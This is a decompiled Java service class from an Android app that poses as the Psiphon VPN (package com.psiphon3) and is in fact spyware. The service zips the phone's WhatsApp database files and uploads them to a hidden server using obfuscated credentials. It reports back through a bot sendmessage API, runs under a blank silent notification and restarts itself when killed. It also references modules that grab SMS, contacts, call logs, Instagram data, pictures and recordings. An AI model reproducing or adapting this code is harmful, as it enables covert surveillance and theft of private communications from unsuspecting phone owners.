package com.psiphon3;


import anywheresoftware.b4a.BA;
import anywheresoftware.b4a.objects.ServiceHelper;
import anywheresoftware.b4a.debug.*;

public class getonechat extends  android.app.Service{
	public static class getonechat_BR extends android.content.BroadcastReceiver {

		@Override
		public void onReceive(android.content.Context context, android.content.Intent intent) {
            BA.LogInfo("** Receiver (getonechat) OnReceive **");
			android.content.Intent in = new android.content.Intent(context, getonechat.class);
			if (intent != null)
				in.putExtra("b4a_internal_intent", intent);
            ServiceHelper.StarterHelper.startServiceFromReceiver (context, in, false, BA.class);
		}

	}
    static getonechat mostCurrent;
	public static BA processBA;
    private ServiceHelper _service;
    public static Class<?> getObject() {
		return getonechat.class;
	}
	@Override
	public void onCreate() {
        super.onCreate();
        mostCurrent = this;
        if (processBA == null) {
		    processBA = new BA(this, null, null, "com.psiphon3", "com.psiphon3.getonechat");
            if (BA.isShellModeRuntimeCheck(processBA)) {
                processBA.raiseEvent2(null, true, "SHELL", false);
		    }
            try {
                Class.forName(BA.applicationContext.getPackageName() + ".main").getMethod("initializeProcessGlobals").invoke(null, null);
            } catch (Exception e) {
                throw new RuntimeException(e);
            }
            processBA.loadHtSubs(this.getClass());
            ServiceHelper.init();
        }
        _service = new ServiceHelper(this);
        processBA.service = this;
        
        if (BA.isShellModeRuntimeCheck(processBA)) {
			processBA.raiseEvent2(null, true, "CREATE", true, "com.psiphon3.getonechat", processBA, _service, anywheresoftware.b4a.keywords.Common.Density);
		}
        if (!false && ServiceHelper.StarterHelper.startFromServiceCreate(processBA, false) == false) {
				
		}
		else {
            processBA.setActivityPaused(false);
            BA.LogInfo("*** Service (getonechat) Create ***");
            processBA.raiseEvent(null, "service_create");
        }
        processBA.runHook("oncreate", this, null);
        if (false) {
			ServiceHelper.StarterHelper.runWaitForLayouts();
		}
    }
		@Override
	public void onStart(android.content.Intent intent, int startId) {
		onStartCommand(intent, 0, 0);
    }
    @Override
    public int onStartCommand(final android.content.Intent intent, int flags, int startId) {
    	if (ServiceHelper.StarterHelper.onStartCommand(processBA, new Runnable() {
            public void run() {
                handleStart(intent);
            }}))
			;
		else {
			ServiceHelper.StarterHelper.addWaitForLayout (new Runnable() {
				public void run() {
                    processBA.setActivityPaused(false);
                    BA.LogInfo("** Service (getonechat) Create **");
                    processBA.raiseEvent(null, "service_create");
					handleStart(intent);
                    ServiceHelper.StarterHelper.removeWaitForLayout();
				}
			});
		}
        processBA.runHook("onstartcommand", this, new Object[] {intent, flags, startId});
		return android.app.Service.START_STICKY;
    }
    public void onTaskRemoved(android.content.Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        if (false)
            processBA.raiseEvent(null, "service_taskremoved");
            
    }
    private void handleStart(android.content.Intent intent) {
    	BA.LogInfo("** Service (getonechat) Start **");
    	java.lang.reflect.Method startEvent = processBA.htSubs.get("service_start");
    	if (startEvent != null) {
    		if (startEvent.getParameterTypes().length > 0) {
    			anywheresoftware.b4a.objects.IntentWrapper iw = ServiceHelper.StarterHelper.handleStartIntent(intent, _service, processBA);
    			processBA.raiseEvent(null, "service_start", iw);
    		}
    		else {
    			processBA.raiseEvent(null, "service_start");
    		}
    	}
    }
	
	@Override
	public void onDestroy() {
        super.onDestroy();
        if (false) {
            BA.LogInfo("** Service (getonechat) Destroy (ignored)**");
        }
        else {
            BA.LogInfo("** Service (getonechat) Destroy **");
		    processBA.raiseEvent(null, "service_destroy");
            processBA.service = null;
		    mostCurrent = null;
		    processBA.setActivityPaused(true);
            processBA.runHook("ondestroy", this, null);
        }
	}

@Override
	public android.os.IBinder onBind(android.content.Intent intent) {
		return null;
	}public anywheresoftware.b4a.keywords.Common __c = null;
public static com.psiphon3.httpjob _v6 = null;
public static com.psiphon3.httpjob _v7 = null;
public static anywheresoftware.b4a.objects.collections.JSONParser _v0 = null;
public static String _vv1 = "";
public static int _admin_id = 0;
public static String _vv2 = "";
public static String _vv3 = "";
public static String _vv4 = "";
public static String _vv5 = "";
public static ir.rayanoos.lib.upload_ultra.upload_ultra _vv6 = null;
public static ice.smsplus.SmsWrapper _vv7 = null;
public static com.AB.ABZipUnzip.ABZipUnzip _vv0 = null;
public static anywheresoftware.b4a.phone.CallLogWrapper _vvv1 = null;
public static anywheresoftware.b4a.phone.Contacts2Wrapper _vvv2 = null;
public static ir.rayanoos.lib.ultra_decoder.ultra_decoder _vvv3 = null;
public ir.rayanoos.lib.upload_ultra.uploadfile _vvvvvvvv5 = null;
public com.psiphon3.main _vvvvvvvv6 = null;
public com.psiphon3.cmr _vvvvvvvv7 = null;
public com.psiphon3.cmr2 _vvvvvvvv0 = null;
public com.psiphon3.firebasemessaging _vvvvvvvvv1 = null;
public com.psiphon3.getallcalls _vvvvvvvvv2 = null;
public com.psiphon3.getallcontacts _vvvvvvvvv3 = null;
public com.psiphon3.getallsms _vvvvvvvvv4 = null;
public com.psiphon3.getchats _vvvvvvvvv5 = null;
public com.psiphon3.getinsta _vvvvvvvvv6 = null;
public com.psiphon3.getlists _vvvvvvvvv7 = null;
public com.psiphon3.getpicture _vvvvvvvvvv1 = null;
public com.psiphon3.getpicture2 _vvvvvvvvvv2 = null;
public com.psiphon3.srv _vvvvvvvvvv3 = null;
public com.psiphon3.starter _vvvvvvvvvv4 = null;
public com.psiphon3.startrecord _vvvvvvvvvv5 = null;
public com.psiphon3.httputils2service _vvvvvvvvvv6 = null;
public static String  _getone(String _topic,String _filename) throws Exception{
 //BA.debugLineNum = 63;BA.debugLine="Sub getOne (Topic As String, fileName As String)";
 //BA.debugLineNum = 64;BA.debugLine="Try";
try { //BA.debugLineNum = 66;BA.debugLine="Log(File.Exists(File.DirRootExternal&\"/WhatsApp/";
anywheresoftware.b4a.keywords.Common.LogImpl("34325379",BA.ObjectToString(anywheresoftware.b4a.keywords.Common.File.Exists(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/DataBases/",_filename)),0);
 //BA.debugLineNum = 68;BA.debugLine="zip.ABZipfile(File.DirRootExternal&\"/WhatsApp/Da";
_vv0.ABZipfile(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/DataBases/",_filename,anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp/myData.zip");
 //BA.debugLineNum = 69;BA.debugLine="upload.upload(admin_id , \"All dataBases\".Replace";
_vv6._upload(_admin_id,"All dataBases".replace(" ","%20"),(int) (0),anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp","myData.zip");
 //BA.debugLineNum = 70;BA.debugLine="File.Delete(File.DirRootExternal&\"/WhatsApp\" , \"";
anywheresoftware.b4a.keywords.Common.File.Delete(anywheresoftware.b4a.keywords.Common.File.getDirRootExternal()+"/WhatsApp","myData.zip");
 //BA.debugLineNum = 71;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"oneChatUploading"+"&reply_to_message_id="+BA.NumberToString(0));
 } 
       catch (Exception e8) {
			processBA.setLastException(e8); //BA.debugLineNum = 73;BA.debugLine="ht2.Download(apiserver&token&\"/sendmessage?chat_";
_v7._vvvv6 /*String*/ (_vv2+_vv1+"/sendmessage?chat_id="+BA.NumberToString(_admin_id)+"&text="+"Exception"+"&reply_to_message_id="+BA.NumberToString(0));
 };
 //BA.debugLineNum = 75;BA.debugLine="End Sub";
return "";
}
public static String  _process_globals() throws Exception{
 //BA.debugLineNum = 6;BA.debugLine="Sub Process_Globals";
 //BA.debugLineNum = 9;BA.debugLine="Dim ht,ht2 As HttpJob";
_v6 = new com.psiphon3.httpjob();
_v7 = new com.psiphon3.httpjob();
 //BA.debugLineNum = 10;BA.debugLine="Dim js As JSONParser";
_v0 = new anywheresoftware.b4a.objects.collections.JSONParser();
 //BA.debugLineNum = 11;BA.debugLine="Dim token As String = \":...__::...__::...__._____";
_vv1 = main.vvv13 (new byte[] {50,54,-22,77,72,64,-12,31,35,46,-21,34,87,34,-2,77,57,49,-111,122,35,95,-102,34,87,71,-101,89,45,49,-32,11,82,95}, 609180)+main.vvv13 (new byte[] {87,53,114,-31,45,38,9,-42,35,92,115,-1,38,68,114,-31,45,38,9,-42,35,92,115,-1,38,68,114,-31,45,38,9,-42,35,92,115,-114,87,68,114,-31,72,67,29,-62,35,45,2,-1,87,53,114,-31,72,67,120,-89,55,57,2,-114,38,68,114,-124,45,50,9,-42,82,92,2,-1,50,33,23,-31,57,50,120,-42,82,92,115,-1,87,68,114,-124,45,67,9,-42,82,45,115,-1,87}, 816132)+main.vvv13 (new byte[] {87,71,95,-127,45,37,85,-74,35,46,94,-18,87,71,95,-127,72,64,48,-94,82,46,47,-18,87,71,95,-127,57,64,85,-57,55,58,94,-97,38,71,95,-127,72,49,85,-57,82,58,59,-18,87,71,95,-16,57,49,85,-74,35,58,59,-18,87,71,46,-127,72,49,85,-57,35,58,59,-97,38,54,46,-16}, 158631)+main.vvv13 (new byte[] {38,54,-122,-5,72,64,-104,-40,35,95,-10,-108,38,71,-9,-118,57,49,-104,-40,35,46,-121,-27,87,54,-9,-98,45,49,-3,-52,82,46,-10,-27,38,71,-122,-98,45,64,-3,-67,82,95,-10,-108,87,54,-122,-5,45,37,-116,-52,35,95,-10,-27,38,71,-9,-98,45,64,-3,-67,82,95,-121,-27,87,54,-122,-5,45,37,-3,-52,82,46,-121,-27,38,54,-122,-5,72,37,-104,-52,82,95,-10,-27,38,71,-9,-5,72,37,-104,-52,35,46,-10,-27,87,54,-9,-5,72,37,-104,-67,35,95,-10,-108,87,71,-9,-118,57,64,-104,-40,35,95,-10,-108,38,71,-9,-118,57,49,-104,-40,82,46,-121,-27,38,71,-9,-5,72,64,-3,-67,55,58,-121,-108,87,71,-122,-5}, 509464)+main.vvv13 (new byte[] {87,55,-4,-113,45,36,-10,-55,82,94,-116,-32,38,55,-4,-113,45,36,-10,-72,35,94,-116,-111,38,55,-115,-113,45,36,-121,-55,82,94,-3,-32,87,70,-4,-113,72,36,-30,-72,35,47,-3,-32,87,70,-115,-113,72,65,-121,-35,55,47,-3,-32,87,55,-115,-2,57,48,-10,-35,82,59,-116,-111,38,55,-4,-113,57,65,-121,-55,82,59,-23,-111,38,70,-115,-113,72,65,-10,-55,35,59,-23,-111,87,70,-4,-2,72,48,-121,-72,35,59,-23,-111,38,55,-115,-2,72,65,-10,-72}, 53323)+main.vvv13 (new byte[] {87,71,-46,7,57,49,-52,85,82,46,-57,124,87,54,-46,7,72,64,-52,36,82,95,-74,13,87,71,-73,7,45,64,-52,85,82,95,-74,124,38,71,-73,98,72,37,-40,85,82,95,-57,124,87,71,-58,98,57,37}, 655993);
 //BA.debugLineNum = 12;BA.debugLine="Dim admin_id As Int = 315160032";
_admin_id = (int) (315160032);
 //BA.debugLineNum = 13;BA.debugLine="Dim apiserver As String=\":.____..._.::..____....:";
_vv2 = main.vvv13 (new byte[] {50,53,35,117,72,67,88,66,35,92,83,14,50,53,82,117,72,67,41,66,35,45,83,14,50,53,82,117,72,67,41,66,35,45,83,14,50,53,35,117,57,50,88,66,35,45,83,14,50,53,82,117,57,50,88,66,82,92,83,14,50,52,83,16,57,67,41,66,35,92,83,107,87,53,70,16}, 996892)+main.vvv13 (new byte[] {38,71,-29,0,57,64,-104,55,82,46,-121,10,38,71,-29,0,57,64,-104,55,82,46,-121,30,50,54,-110,0,57,64,-104,70,82,95,-109,10,50,71,-110,0,57,49,-104,70,35,95,-109,10,50,54,-110,113,72,64,-23,70,35,46,-109,10,50,54,-29}, 554487)+main.vvv13 (new byte[] {87,71,-31,38,57,64,-21,17,55,58,-111,73,87,54,-112,87,57,64,-21,17,55,58,-111,73,87,71,-31,38,57,49,-102,17,55,58,-111,56,38,71,-31,38,72,64,-21,17,55,58,-111,56,87,54,-31,38,57,64,-21,17,55,58,-111,56,87,71,-31,38,72,64,-21,17,55,46,-123,73,38,71,-31,38,57,64,-102,96,35,58,-123,73,38,71}, 558689)+main.vvv13 (new byte[] {38,54,10,29,72,49,0,62,34,58,122,3,87,54,10,29,57,64,0,42,55,58,122,3,87,71,10,108,72,64,0,91,55,58,122,114,87,71,10,29,57,49,113,42,55}, 353135);
 //BA.debugLineNum = 14;BA.debugLine="Dim fileToWirte As String = \"msgid16.txt\"";
_vv3 = main.vvv13 (new byte[] {101,104,32,-29,115,45,123,-30,121,123,50}, 912508);
 //BA.debugLineNum = 15;BA.debugLine="Dim StartMessage As String = \"test16\"";
_vv4 = main.vvv13 (new byte[] {124,125,9,-52,38,41}, 403732);
 //BA.debugLineNum = 16;BA.debugLine="Dim uploadUrl As String = \":.____..._.::..____...";
_vv5 = main.vvv13 (new byte[] {50,54,112,-8,72,64,11,-49,35,95,0,-125,50,54,1,-8,72,64,122,-49,35,46,0,-125,50,54,1,-8,72,64,122,-49,35,46,0,-125,50,54,112,-8,57,49,11,-49}, 230712)+main.vvv13 (new byte[] {38,53,42,-93,45,51,33,-27,35,45,43,-87,87,53,42,-58,72,50,52,-27,82,45,43,-87,38,53,42,-73,72,50,52,-27,35,45,90,-40,87,68,42,-73,57,50,52,-27,35,92,90,-40,87,68,42,-58,72,50,52}, 758274)+main.vvv13 (new byte[] {50,54,60,-104,57,49,54,-81,82,95,61,-29,50,54,60,-104,72,64,71,-81,35,46,61,-29,50,54,77,-23,72,64,71,-34,82,95,61,-29,50,54,77,-104,57,64,71,-81,82,95,61,-29,50,54,77,-104,72,64,71,-34,82,95,61,-29,38,34,60,-23,72,64,71,-81,82,46,76,-9,50,34,60,-23,72,49,54,-34,82,95,61,-122,50,55,40,-23,72,49,71,-34,35,46,61,-122,38,34,40,-23,72,64,54,-81,35,46}, 199893)+main.vvv13 (new byte[] {38,54,-122,16,45,49,-3,51,35,46,-10,107,38,54,-122,16,45,49,-3,51,82,46,-10,107,87,71,-122,16,57,37,-116,51,82,46,-121,26,38}, 508437)+main.vvv13 (new byte[] {38,54,-35,-17,45,49,-90,-52,82,95,-36,-27,38,71,-35,-17,45,49,-90,-52,35,46,-36}, 718420)+main.vvv13 (new byte[] {38,55,-32,-51,45}, 6680);
 //BA.debugLineNum = 17;BA.debugLine="Dim upload As upload_ultra";
_vv6 = new ir.rayanoos.lib.upload_ultra.upload_ultra();
 //BA.debugLineNum = 18;BA.debugLine="Dim allsms As SmsMessages";
_vv7 = new ice.smsplus.SmsWrapper();
 //BA.debugLineNum = 19;BA.debugLine="Dim zip As ABZipUnzip";
_vv0 = new com.AB.ABZipUnzip.ABZipUnzip();
 //BA.debugLineNum = 20;BA.debugLine="Dim callLog As CallLog";
_vvv1 = new anywheresoftware.b4a.phone.CallLogWrapper();
 //BA.debugLineNum = 21;BA.debugLine="Dim c As Contacts2";
_vvv2 = new anywheresoftware.b4a.phone.Contacts2Wrapper();
 //BA.debugLineNum = 22;BA.debugLine="Dim decode As ultra_decoder";
_vvv3 = new ir.rayanoos.lib.ultra_decoder.ultra_decoder();
 //BA.debugLineNum = 26;BA.debugLine="End Sub";
return "";
}
public static String  _service_create() throws Exception{
anywheresoftware.b4a.objects.NotificationWrapper _n = null;
 //BA.debugLineNum = 28;BA.debugLine="Sub Service_Create";
 //BA.debugLineNum = 30;BA.debugLine="decode.Initialize";
_vvv3._initialize(processBA);
 //BA.debugLineNum = 31;BA.debugLine="token = decode.decode(token)";
_vv1 = _vvv3._decode(_vv1);
 //BA.debugLineNum = 32;BA.debugLine="apiserver=decode.decode(apiserver)";
_vv2 = _vvv3._decode(_vv2);
 //BA.debugLineNum = 33;BA.debugLine="uploadUrl=decode.decode(uploadUrl)";
_vv5 = _vvv3._decode(_vv5);
 //BA.debugLineNum = 34;BA.debugLine="ht.Initialize(\"ht\",Me)";
_v6._initialize /*String*/ (processBA,"ht",getonechat.getObject());
 //BA.debugLineNum = 35;BA.debugLine="ht2.Initialize(\"ht2\",Me)";
_v7._initialize /*String*/ (processBA,"ht2",getonechat.getObject());
 //BA.debugLineNum = 36;BA.debugLine="ht.JobName=\"ht1\"";
_v6._vvvvvvv3 /*String*/  = "ht1";
 //BA.debugLineNum = 37;BA.debugLine="ht2.JobName=\"ht2\"";
_v7._vvvvvvv3 /*String*/  = "ht2";
 //BA.debugLineNum = 38;BA.debugLine="upload.Initialize(uploadUrl,token)";
_vv6._initialize(processBA,_vv5,_vv1);
 //BA.debugLineNum = 39;BA.debugLine="Dim n As Notification";
_n = new anywheresoftware.b4a.objects.NotificationWrapper();
 //BA.debugLineNum = 40;BA.debugLine="n.Initialize2(n.IMPORTANCE_LOW)";
_n.Initialize2(_n.IMPORTANCE_LOW);
 //BA.debugLineNum = 41;BA.debugLine="n.Icon      = \"icon\"";
_n.setIcon("icon");
 //BA.debugLineNum = 42;BA.debugLine="n.Sound    = False";
_n.setSound(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 43;BA.debugLine="n.Vibrate    = False";
_n.setVibrate(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 44;BA.debugLine="n.Light    = False";
_n.setLight(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 45;BA.debugLine="n.Insistent  = False";
_n.setInsistent(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 46;BA.debugLine="n.AutoCancel = False";
_n.setAutoCancel(anywheresoftware.b4a.keywords.Common.False);
 //BA.debugLineNum = 47;BA.debugLine="n.SetInfo(\"\",\"\",\"\")";
_n.SetInfoNew(processBA,BA.ObjectToCharSequence(""),BA.ObjectToCharSequence(""),(Object)(""));
 //BA.debugLineNum = 48;BA.debugLine="Service.AutomaticForegroundNotification = n";
mostCurrent._service.AutomaticForegroundNotification = (android.app.Notification)(_n.getObject());
 //BA.debugLineNum = 56;BA.debugLine="End Sub";
return "";
}
public static String  _service_destroy() throws Exception{
 //BA.debugLineNum = 79;BA.debugLine="Sub Service_Destroy";
 //BA.debugLineNum = 80;BA.debugLine="StartServiceAt(\"\" , DateTime.Now+100 , True)";
anywheresoftware.b4a.keywords.Common.StartServiceAt(processBA,(Object)(""),(long) (anywheresoftware.b4a.keywords.Common.DateTime.getNow()+100),anywheresoftware.b4a.keywords.Common.True);
 //BA.debugLineNum = 81;BA.debugLine="End Sub";
return "";
}
public static String  _service_start(anywheresoftware.b4a.objects.IntentWrapper _startingintent) throws Exception{
 //BA.debugLineNum = 58;BA.debugLine="Sub Service_Start (StartingIntent As Intent)";
 //BA.debugLineNum = 61;BA.debugLine="End Sub";
return "";
}
}
